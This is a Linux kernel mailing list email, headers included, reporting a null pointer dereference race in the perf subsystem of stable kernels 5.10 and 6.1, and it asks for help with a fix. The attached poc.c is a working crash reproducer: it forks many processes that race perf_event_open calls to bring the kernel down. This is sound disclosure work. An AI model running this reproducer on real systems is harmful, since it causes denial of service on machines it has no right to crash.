Return-Path: <linux-kernel-owner@vger.kernel.org>
X-Original-To: lists+linux-kernel@lfdr.de
Delivered-To: lists+linux-kernel@lfdr.de
Received: from out1.vger.email (out1.vger.email [IPv6:2620:137:e000::1:20])
	by mail.lfdr.de (Postfix) with ESMTP id 842667BC4E3
	for <lists+linux-kernel@lfdr.de>; Sat,  7 Oct 2023 07:48:09 +0200 (CEST)
Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
        id S1343565AbjJGFsH (ORCPT <rfc822;lists+linux-kernel@lfdr.de>);
        Sat, 7 Oct 2023 01:48:07 -0400
Received: from lindbergh.monkeyblade.net ([23.128.96.19]:34504 "EHLO
        lindbergh.monkeyblade.net" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
        with ESMTP id S233675AbjJGFsF (ORCPT
        <rfc822;linux-kernel@vger.kernel.org>);
        Sat, 7 Oct 2023 01:48:05 -0400
Received: from mail-pj1-x1029.google.com (mail-pj1-x1029.google.com [IPv6:2607:f8b0:4864:20::1029])
        by lindbergh.monkeyblade.net (Postfix) with ESMTPS id D70D0BB;
        Fri,  6 Oct 2023 22:48:04 -0700 (PDT)
Received: by mail-pj1-x1029.google.com with SMTP id 98e67ed59e1d1-2777a5e22b5so2247554a91.1;
        Fri, 06 Oct 2023 22:48:04 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20230601; t=1696657684; x=1697262484; darn=vger.kernel.org;
        h=content-disposition:mime-version:message-id:subject:to:from:date
         :from:to:cc:subject:date:message-id:reply-to;
        bh=a8APydBzGmBAWd7VQe5JSgUK5E2jWt6CWbg4P3bjY5w=;
        b=kIsurnQV+mUP9WQ+nNVVt43SB0KTPhSifBEogknBAR/HSMjo0sy+aG/7ADM6Y+JEwv
         gzT21nq5Qarz2iOsj83ZMWY48VH7TCsB9JvaGbCPHWr16FpouiRRF1gGXM7gwdg2bT2D
         TJx1W3JvcRph3QQRryPnKYS1gR28hTPjz7OnJUavH9Kx78GnTSI5CvcEvaewqYNAeG7v
         GKxxI+vSTk9Um5GopQgWi73g8RwoBNds+AchFg0p64ayn0cdSmk9OHr4RUR77OLl/wdN
         beXhR84e94rP8nmoyBp5bC5Qz4aFWPdMASnXQkHYJMqETFCtOa3ovX5MZToGy8dFvkso
         vU7A==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20230601; t=1696657684; x=1697262484;
        h=content-disposition:mime-version:message-id:subject:to:from:date
         :x-gm-message-state:from:to:cc:subject:date:message-id:reply-to;
        bh=a8APydBzGmBAWd7VQe5JSgUK5E2jWt6CWbg4P3bjY5w=;
        b=Z9eoiuMpAOqvR1P7YNsOpyJVsnwsZdgzGjOXazB6HkqZ2F/Rd8ZMtX9jwFOPxQp7wS
         UQTWCcoIFzSJ2tVx0kQRgS2weCDvo5lll6et8IXZCEoDU5ZfTtfRVvFGQHIByxAuAh0Z
         YhYAkkWkaBp9onjjqt9eVZcu3lhD3yZOHJIjl61GfCHqKWslPWq3ZJ5ZXlZp+G39HefD
         aWp2lXfCpRJO48CqxZ07uHJkr2yrISFthqxOlRPx8DQZ6DbFOQFjVx1gwh5oTtuK5Crj
         b8Vqd1BL2JGhPumf02sxhSYJqcUTsVjgP25w/H5uzNvRSs7GUT3zPxrm07ctb8LhFDJw
         8Mdw==
X-Gm-Message-State: AOJu0YyvXkexjgI7Ub6LwUlh4yDXrfF3RpO0cgbd4wTLsu8Ju2NDCbgo
        BThhOroBAoQ4bO9NuOZsI6diD0HjxNjL8u6J
X-Google-Smtp-Source: AGHT+IFZUP0Yvt395+U2TSgvQ2D1Xv8KVNhED3yzLpKI4j/hEJbOW/DP/3cHWslT1Ec+7ExtqgRrZw==
X-Received: by 2002:a17:902:e84d:b0:1c5:ec97:1718 with SMTP id t13-20020a170902e84d00b001c5ec971718mr11084356plg.6.1696657683763;
        Fri, 06 Oct 2023 22:48:03 -0700 (PDT)
Received: from westworld ([2a00:79e1:abc:f604:65ef:3071:e2b0:2c11])
        by smtp.gmail.com with ESMTPSA id iw7-20020a170903044700b001c5f62a639asm4902785plb.196.2023.10.06.22.48.00
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Fri, 06 Oct 2023 22:48:02 -0700 (PDT)
Date:   Fri, 6 Oct 2023 22:47:57 -0700
From:   Kyle Zeng <zengyhkyle@gmail.com>
To:     linux-kernel@vger.kernel.org, stable@vger.kernel.org
Subject: nullptr-deference in perf
Message-ID: <ZSDxDZR5hoaKTCdP@westworld>
MIME-Version: 1.0
Content-Type: multipart/mixed; boundary="IS/x4giOAnmQGjnO"
Content-Disposition: inline
X-Spam-Status: No, score=-2.1 required=5.0 tests=BAYES_00,DKIM_SIGNED,
        DKIM_VALID,DKIM_VALID_AU,DKIM_VALID_EF,FREEMAIL_FROM,
        RCVD_IN_DNSWL_NONE,SPF_HELO_NONE,SPF_PASS autolearn=ham
        autolearn_force=no version=3.4.6
X-Spam-Checker-Version: SpamAssassin 3.4.6 (2021-04-09) on
        lindbergh.monkeyblade.net
Precedence: bulk
List-ID: <linux-kernel.vger.kernel.org>
X-Mailing-List: linux-kernel@vger.kernel.org


--IS/x4giOAnmQGjnO
Content-Type: text/plain; charset=us-ascii
Content-Disposition: inline

Hi there,

I found a nullptr dereference in perf subsystem and it affects at least
v5.10 and v6.1 stable trees. (the same poc cannot trigger the crash in
the mainline).

I fail to find the root cause the bug. All I know is that it is a race
condition in the logic of moving_groups from pure software-based perf
events to hardware ones. More specifically, when we add a hardware perf
event to a software event group, it will trigger a "move_group" logic in
perf_event_open. When the "move_group" logic happens, it will remove all
existing events from the context first using `perf_remove_from_context`.
And it will invoke `__perf_remove_from_context` through
`event_function_call`.

Notice that `event_function_call` is defined as follow:
~~~
static void event_function_call(struct perf_event *event, event_f func, void *data)
{
	...
	func(event, NULL, ctx, data);
	...
}
~~~
This means `__perf_remove_from_context` will be invoked with
cpuctx==NULL, which leads to invoking `event_sched_out` with cpuctx ==
NULL.
At this moment, as long as the event is active, we are going to invoke
the `if (event->attr.exclusive || !cpuctx->active_oncpu)` logic, which
is a null pointer deference.

I don't know the proper way to patch this bug. So I'm asking for help.

A reproducer is attached to this email.

Best,
Kyle Zeng

--IS/x4giOAnmQGjnO
Content-Type: text/x-csrc; charset=us-ascii
Content-Disposition: attachment; filename="poc.c"

#define _GNU_SOURCE 

#include <dirent.h>
#include <endian.h>
#include <errno.h>
#include <fcntl.h>
#include <pthread.h>
#include <signal.h>
#include <stdarg.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/prctl.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>
#include <assert.h>
#include <linux/perf_event.h>

#include <linux/futex.h>

int pid;
int group_fd;

void context_setup()
{
	int ret;
	struct perf_event_attr attr = {0};

	pid = getpid();
	
	attr.type = PERF_TYPE_SOFTWARE;
	attr.config = PERF_COUNT_SW_CPU_CLOCK;
	attr.size = sizeof(attr);
	attr.exclude_kernel = 1;

	group_fd = syscall(__NR_perf_event_open, &attr, pid, 0, -1, 0); // group_fd = -1
//	printf("group_fd: %d\n", group_fd);
	assert(group_fd != -1);
	//set_cpu(0);
}

void *func1(void *arg)
{
	//set_cpu(2);
	struct perf_event_attr attr = {.size = sizeof(attr)};

	attr.type = PERF_TYPE_SOFTWARE;
	attr.config = PERF_COUNT_SW_CPU_CLOCK;
	attr.exclude_kernel = 1;

	for(int i = 0; i < 0x20; i++)
		syscall(__NR_perf_event_open, &attr, pid, 0, group_fd, 0);
}

void *func2(void *arg)
{
	//set_cpu(1);
	struct perf_event_attr attr = {.size = sizeof(attr)};

	attr.type = PERF_TYPE_HARDWARE;
	attr.config = PERF_COUNT_HW_CPU_CYCLES;
	attr.exclude_kernel = 1;

	syscall(__NR_perf_event_open, &attr, pid, 0, group_fd, 0);
}

void execute_two()
{
	pthread_t tid1, tid2;

	pthread_create(&tid1, NULL, func1, NULL);
	pthread_create(&tid2, NULL, func2, NULL);

//	set_cpu(0);

	pthread_join(tid1, NULL);
	pthread_join(tid2, NULL);
}

static void loop(void)
{
	while(1) {
		if(!fork()) {
			context_setup();
			execute_two();
			exit(0);
		}
		wait(NULL);
	}
}


int main(void)
{
	for(int i=0; i<16; i++) {
		if(!fork()) {
			loop();
		}
	}
	sleep(100000000);
	return 0;
}

--IS/x4giOAnmQGjnO--
